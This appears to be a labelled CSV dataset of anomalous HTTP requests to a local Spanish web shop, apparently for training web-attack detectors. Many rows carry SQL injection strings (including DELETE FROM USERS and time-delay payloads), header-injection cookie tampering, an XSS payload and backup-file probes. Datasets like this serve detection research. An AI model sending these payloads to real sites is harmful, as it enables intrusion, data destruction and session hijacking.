,Method,User-Agent,Pragma,Cache-Control,Accept,Accept-encoding,Accept-charset,language,host,cookie,content-type,connection,lenght,content,classification,URL
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4B2966415E77A36CF99F5C35C931E9D0,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%22+AND+%221%22%3D%221&login=brownlee&pwd=aluminada&remember=off&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=052BCD877D411FF0114917348F05CDD2,application/x-www-form-urlencoded,Connection: close,Content-Length: 85,modo=entrar%22+AND+%221%22%3D%221&login=brownlee&pwd=aluminada&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4B7984FEF65BEDC56B0A64AF0F7F008F,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=brownlee&pwd=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=off&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8308022D80916B3EACF6D2C67111217B,application/x-www-form-urlencoded,Connection: close,Content-Length: 115,modo=entrar&login=brownlee&pwd=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=FFC48825F6ECE471317D4AC8680C0F95,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=brownlee&pwd=aluminada&remember=off&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4E68C6178868FF078EC57E49AB6BFD60,application/x-www-form-urlencoded,Connection: close,Content-Length: 64,modo=entrar&loginA=brownlee&pwd=aluminada&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=6C6ECA085BB0F7B99C5B5F9D0451C450,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2 HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=F349D882FC518BC631C3EDC3812F8B94,application/x-www-form-urlencoded,Connection: close,Content-Length: 5,idA=2,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=80DD5D56DB3D946B3BF96543601AE476,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=DC5F877FDD61C6A18AB0D5EDF2E26C13,application/x-www-form-urlencoded,Connection: close,Content-Length: 54,errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=03210FB8B764B36BF8E8FA8F3310A4C5,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%2B HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=93D1BECB55E459643C4954B4D4E39A5D,application/x-www-form-urlencoded,Connection: close,Content-Length: 12,errorMsg=%2B,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=48756AE586CD5F407CCA6D29F27F6DEA,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=2C685D738A7027A0C8F3166E0F466FCA,application/x-www-form-urlencoded,Connection: close,Content-Length: 34,errorMsgA=Credenciales+incorrectas,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0F063C1629E699766D64FA2DBE070071,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2860&B1=Confirmar%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0C4A69114B35C53F46BE26C4C7216595,application/x-www-form-urlencoded,Connection: close,Content-Length: 79,modo=insertar&precio=2860&B1=Confirmar%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=5AE8AD8A05E28319C200263564E0706A,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&precio=2860&B1=Confirmar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=35C59DB4A8304A1748AD788F0CE62144,application/x-www-form-urlencoded,Connection: close,Content-Length: 115,modo=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&precio=2860&B1=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4541BF11E5ED323EF858397951F36250,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2860&B1=Pasar+por+caja%2F HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=7DF0C576F9BE8E0ED6B6EB642C818B34,application/x-www-form-urlencoded,Connection: close,Content-Length: 46,modo=insertar&precio=2860&B1=Pasar+por+caja%2F,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=2E6E07F349F204D1C21BDC3A0EE50487,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2860&B1A=Confirmar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0D51891A6889A3DD265A37CD6E900CD1,application/x-www-form-urlencoded,Connection: close,Content-Length: 39,modo=insertar&precio=2860&B1A=Confirmar,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=C5FF69AB10E384F49CDEDDFB9B1F4C6E,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nizar&password=deSem81oCadErO&nombre=Tristana&apellidos=Laconich+Fraga&email=williams_mellish%40elcarritodelacompra.ki&dni=14559882P&direccion=Calle+Arroyo+Opa%F1el%2C+46+&ciudad=Establ%E9s&cp=17708&provincia=Castell%F3n&ntc=3554581547535889%252B&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=D9AF1412DB43A10AF5477AD38B8FBA89,application/x-www-form-urlencoded,Connection: close,Content-Length: 279,modo=registro&login=nizar&password=deSem81oCadErO&nombre=Tristana&apellidos=Laconich+Fraga&email=williams_mellish%40elcarritodelacompra.ki&dni=14559882P&direccion=Calle+Arroyo+Opa%F1el%2C+46+&ciudad=Establ%E9s&cp=17708&provincia=Castell%F3n&ntc=3554581547535889%252B&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=7DED26C0340D4280E212839838B70359,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nizar&password=deSem81oCadErO&nombre=Tristana&apellidos=Laconich+Fraga&email=williams_mellish%40elcarritodelacompra.ki&dni=14559882P&direccion=Calle+Arroyo+Opa%F1el%2C+46+&ciudad=Establ%E9s&cp=17708&provincia=Castell%F3n&ntc=%257C&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=E1C8BDBA6096E41719FD38B92A6C07C1,application/x-www-form-urlencoded,Connection: close,Content-Length: 263,modo=registro&login=nizar&password=deSem81oCadErO&nombre=Tristana&apellidos=Laconich+Fraga&email=williams_mellish%40elcarritodelacompra.ki&dni=14559882P&direccion=Calle+Arroyo+Opa%F1el%2C+46+&ciudad=Establ%E9s&cp=17708&provincia=Castell%F3n&ntc=%257C&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4B0DCCD3E3F56C7DA2FDC5A5E14AEDFA,,close,,,1,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nizar&password=deSem81oCadErO&nombre=R%27a*ms%27%E9s&apellidos=Laconich+Fraga&email=williams_mellish%40elcarritodelacompra.ki&dni=14559882P&direccion=Calle+Arroyo+Opa%F1el%2C+46+&ciudad=Establ%E9s&cp=17708&provincia=Castell%F3n&ntc=3554581547535889&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0C5A2DF8614446B973CCC1E030178A74,application/x-www-form-urlencoded,Connection: close,Content-Length: 281,modo=registro&login=nizar&password=deSem81oCadErO&nombre=R%27a*ms%27%E9s&apellidos=Laconich+Fraga&email=williams_mellish%40elcarritodelacompra.ki&dni=14559882P&direccion=Calle+Arroyo+Opa%F1el%2C+46+&ciudad=Establ%E9s&cp=17708&provincia=Castell%F3n&ntc=3554581547535889&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=CBD673AEA085294B7EDF4A3202AC480D,,close,,,1,http://localhost:8080/tienda1/publico.Bak HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=07BE95FBEF1CDFC228800B857D5CA1AB,,close,,,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito%7C HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=C190004A4657808CE1BC157EAD3F8F50,application/x-www-form-urlencoded,Connection: close,Content-Length: 20,B2=Vaciar+carrito%7C,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=2317C68D7C1679A0FCB29B5B5583E119,,close,,,1,http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=C679F6115E8702A7E45FC118A9DF6256,application/x-www-form-urlencoded,Connection: close,Content-Length: 18,B2A=Vaciar+carrito,1,http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=698F005EE2503571DF51B8EF54DC80ED,,close,,,1,http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.Bak HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=DF32749121A91546338A70A29580539E,,close,,,1,http://localhost:8080/asf-logo-wide.gif.BAK HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=83384CF4D1C377B1A4A5587978E4CB68,,close,,,1,http://localhost:8080/CFIDE/administrator/welcome.cfm HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=C8FF145FB22C3D4D61E12607BFD83E2F,,close,,,1,http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/6909030637832563290.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4729000871FD931C090DC2E093EB6D1E,,close,,,1,http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg~ HTTP/1.1
Anomalous,PUT,0,no-cache,no-cache,1,0,0,en,1,JSESSIONID=9F6C79B938154B2A3045FFA24361610C,application/x-www-form-urlencoded,Connection: close,Content-Length: 257,modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silva&email=pavlis%40travelzone.vc&dni=84634236D&direccion=C%2F+Rio+Bidasoa%2C+199+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=B7EAC4C93AD00E1CAA4E7E6E92509F30,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silvaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&email=pavlis%40travelzone.vc&dni=84634236D&direccion=C%2F+Rio+Bidasoa%2C+199+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=FD83C72EB9F0197B07D55AC9F185A7F9,application/x-www-form-urlencoded,Connection: close,Content-Length: 318,modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silvaany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&email=pavlis%40travelzone.vc&dni=84634236D&direccion=C%2F+Rio+Bidasoa%2C+199+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=F894BB61EB06A25AFB125BC393E34BCD,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silva&email=pavlis%40travelzone.vc&dni=84634236D&direccion=R%2B%2B%2Bua+Clara+Campoamor%2C+6%2C+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=74477F570D6D5AAC097B26DC3B2DCC2B,application/x-www-form-urlencoded,Connection: close,Content-Length: 270,modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silva&email=pavlis%40travelzone.vc&dni=84634236D&direccion=R%2B%2B%2Bua+Clara+Campoamor%2C+6%2C+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=08A081152BB9890C416A8234C1A0C3B0,,close,,,1,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silva&emailA=pavlis%40travelzone.vc&dni=84634236D&direccion=C%2F+Rio+Bidasoa%2C+199+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=9198E2B7733397365F32D5C4DA17ABAB,application/x-www-form-urlencoded,Connection: close,Content-Length: 258,modo=registro&login=armenta&password=villero&nombre=Rondel&apellidos=Avalos+Da+Silva&emailA=pavlis%40travelzone.vc&dni=84634236D&direccion=C%2F+Rio+Bidasoa%2C+199+&ciudad=Roca+de+la+Sierra%2C+La&cp=46910&provincia=Valladolid&ntc=1701163791515432&B1=Registrar,1,http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=ADD12762DC9E1707377593D1D03506ED,,close,,,1,http://localhost:8080/IBMWebAS HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=E32AD8DC74CC5A47E93AE2D0EBA5B417,,close,,,1,http://localhost:8080/CFIDE/administrator/logout.cfm HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=69AB542B565A65FD47B7A949B0C063A7,,close,,,1,http://localhost:8080/tienda1/imagenes/1.gif.old HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=679EF6ED8DFC0715D67F5080810B1D79,,close,,,1,http://localhost:8080/tienda1/imagenes/1.gif/asf-logo-wide.gif/.OLD HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=88C07EFA2724FCF6C5B85B882EE422C3,,close,,,1,http://localhost:8080/worldmusic/action/catalog HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=4C662377CD9BE9745A97EB428F29FA44,,close,,,1,http://localhost:8080/tienda1/6909030637832563290.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=529E1A12C590241833B7C80E6F33DA0F,,close,,,1,http://localhost:8080.old HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=7957AD4070E613A0AEA044E82FC0A1B6,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidad=29&B1=A%F1adir+al+carrito%252B HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=B62BD782E4146EA98554E4790564C453,application/x-www-form-urlencoded,Connection: close,Content-Length: 77,id=2&nombre=Queso+Manchego&precio=100&cantidad=29&B1=A%F1adir+al+carrito%252B,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=BBD734DA0F14CFF203CA105784FC731C,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=100&cantidad=29&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=45861EAB504CBF8A08DD6387B7CAEAF0,application/x-www-form-urlencoded,Connection: close,Content-Length: 155,id=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&nombre=Queso+Manchego&precio=100&cantidad=29&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=593E419C49A527F663D02A036EFF1DA3,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=29&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=1B7C87693DAF536C723A7D6ED107C0FB,application/x-www-form-urlencoded,Connection: close,Content-Length: 74,id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=29&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=E72CA1BEA3FBF901D4A561A9E001AD87,,close,,,1,http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=100&cantidadA=29&B1=A%F1adir+al+carrito HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=A6600B3324E83C091913416C93438B2A,application/x-www-form-urlencoded,Connection: close,Content-Length: 73,id=2&nombre=Queso+Manchego&precio=100&cantidadA=29&B1=A%F1adir+al+carrito,1,http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=154888D715CDD8448185A0B14804ED71,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=semmens&pwd=5872ra&remember=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=885EA5E7B7548DDCA55B99D615885241,application/x-www-form-urlencoded,Connection: close,Content-Length: 122,modo=entrar&login=semmens&pwd=5872ra&remember=any%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=81FD07FDED7FD9F0678D87A4B66F8C17,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=d%2Fmsrtime&pwd=5872ra&remember=off&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=ACA42D4A66F9F35425D0A4A4A83D6751,application/x-www-form-urlencoded,Connection: close,Content-Length: 63,modo=entrar&login=d%2Fmsrtime&pwd=5872ra&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=406334E09118C4428ECCDDF1514CF469,,close,,,1,http://localhost:8080/tienda1/publico/autenticar.jsp?modoA=entrar&login=semmens&pwd=5872ra&remember=off&B1=Entrar HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=202D4FB0DADC6F43D1C568967FEDA749,application/x-www-form-urlencoded,Connection: close,Content-Length: 60,modoA=entrar&login=semmens&pwd=5872ra&remember=off&B1=Entrar,1,http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=67FBC9ADF7E32F4C315D360887B98458,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1+ HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=65E4D83C37A87ABD7039CAC65D287F2C,application/x-www-form-urlencoded,Connection: close,Content-Length: 5,id=1+,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0944A7D06C68E42437F9A0D4109E02BE,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27+AND+%271%27%3D%271 HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=DB609CFD8895AA2E2B70977B8F01F452,application/x-www-form-urlencoded,Connection: close,Content-Length: 25,id=%27+AND+%271%27%3D%271,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=357DBE415D894D0ECB28BB7D7EA4EA3A,,close,,,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0DF1ED73BE0D060BDBBCA04F10432DBE,application/x-www-form-urlencoded,Connection: close,Content-Length: 5,idA=1,1,http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=9E54A287FDCDB1DA666EFE306F899294,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0A49721B2D4B6084573BC2F9CBD172A3,application/x-www-form-urlencoded,Connection: close,Content-Length: 83,errorMsg=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=12ED92082D9FCA87605CE22FDF4BF54D,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=CE4937054B93FD46B3CCA75AE17FDE84,application/x-www-form-urlencoded,Connection: close,Content-Length: 34,errorMsgA=Credenciales+incorrectas,1,http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=377D9C856B18BEC0B51E6F14C1001F02,,close,,,1,http://localhost:8080/tienda1/publico/entrar.jsp/4861362529278789730 HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=0BFA042F903C40176857222AD2D8E452,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=BDFBB7634DD93F9161CFB1BBA49AB7A9,application/x-www-form-urlencoded,Connection: close,Content-Length: 83,modo=insertar&precio=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Pasar+por+caja,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=82B06ABF85FAC5E7D39CDBA74748C232,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=5627&B1=Confirmar%2F HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=441C324ECE72D02AEF950D5410D16431,application/x-www-form-urlencoded,Connection: close,Content-Length: 41,modo=insertar&precio=5627&B1=Confirmar%2F,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,GET,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=8542BFD453DFE9F354575FAEC7D2C8B9,,close,,,1,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=5627&B1=Pasar+por+caja HTTP/1.1
Anomalous,POST,0,no-cache,no-cache,0,0,0,en,0,JSESSIONID=B2B572FEFAEFEC86C0526B29DB88EFC1,application/x-www-form-urlencoded,Connection: close,Content-Length: 44,modo=insertar&precioA=5627&B1=Pasar+por+caja,1,http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1
Anomalous,PUT,0,no-cache,no-cache,1,0,0,en,1,JSESSIONID=840C233AFC78CC6D7858F493EE19E625,application/x-www-form-urlencoded,Connection: close,Content-Length: 278,modo=registro&login=leupold&password=f8i73a&nombre=Rogaciano&apellidos=Huasupoma+Llobera&email=florath_cochran%40hiperzaragoza.aq&dni=42620172E&direccion=C%2F+Sagrados+Corazones+27%2C+7%3FA&ciudad=Villalbilla+de+Gumiel&cp=10230&provincia=Zamora&ntc=1281104729948051&B1=Registrar,1,http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1
